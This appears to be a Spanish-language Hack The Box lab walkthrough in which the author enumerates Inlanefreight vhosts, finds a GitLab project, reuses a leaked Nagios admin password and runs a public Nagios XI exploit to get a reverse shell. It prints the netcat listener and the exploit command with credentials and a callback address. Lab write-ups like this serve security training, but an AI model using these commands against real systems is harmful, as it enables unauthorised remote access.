Laboratorio de Atacando a aplicaciones Comunes - Parte 2

Oct 9, 2025 · 2 mins read
hackthebox Gitlab Nagios

Enunciado

Durante una prueba de penetración externa para la empresa Inlanefreight, te encuentras con un host que, a primera vista, no te parece muy interesante. En este punto de la evaluación, has agotado todas las opciones y has llegado a varios callejones sin salida. Al revisar tus notas de enumeración, algo te llama la atención sobre este host en particular. También ves una nota que no recuerdas sobre el vhost gitlab.inlanefreight.local. Realizar una enumeración más profunda e iterativa revela varias fallas graves. Enumere el objetivo con cuidado y responda a todas las preguntas a continuación para completar la segunda parte de la evaluación de habilidades.

¿Cuál es la URL de la instancia de Wordpress? Empezamos con el reconocimiento del host.

Al entrar en la página web revisando el código vemos las siguientes URL Añadimos IP blog.inlanefreight.local a nuestro /etc/hosts Y al visitarlo vemos que es lo que estamos buscando. ¿Cual es el nombre del proyecto público de GitLab? Investigamos un poco la web y vemos que tiene la versión 13.12.11 Nos creamos un usuario en Gitlab y al acceder curioseando vemos los proyectos compartidos. El repositorio es Virtualhost. ¿Cúal es el FQDN del tercert vhost? Revisando en el repositorio entramos al archivo virtualhost.sh Y vemos abajo que nos ponen un ejemplo de sitio. ¿Cúal es la aplicación que está corriendo en el tercert vhost? Vamos a añadir este vhost a nuestro /etc/hosts. Visitamos el vhost. Y vemos que está corriendo Nagios. ¿Cúal es la contraseña del usuario admin para el acceso a la aplicación? Antes de ponernos a hacer fuerza bruta revisamos los proyectos en Gitlab. Vemos el archivo INSTALL Y vemos un ejemplo de usuario y contraseña. Probamos y podemos acceder. Obtenga acceso de shell inverso en el objetivo y envíe el contenido del archivo flag.txt. Vemos la versión de Nagios para buscar alguna vulnerabilidad que nos permita ejecutar comandos en el servidor posteriormente. Buscamos ya sabiendo la versión con searchsploit los script disponibles.

searchsploit Nagios XI

Nos copiamos el script a nuestro directorio de trabajo.

locate 49422.py
cp /usr/share/.../49422.py ./

Luego de revisar un poco como funciona lo ejecutamos tal que así: Nos ponemos en escucha por un puerto en mi caso puse 4444

nc -nlvp 4444

python3 49422.py http://monitoring.inlanefreight.local/ nagiosadmin 'oilaKglm7M09@CPL&^lC' <Nuestra_IP> 4444

Al ejecutarlo debemos obtener una reverse shell y en el propio directorio tenemos la flag.
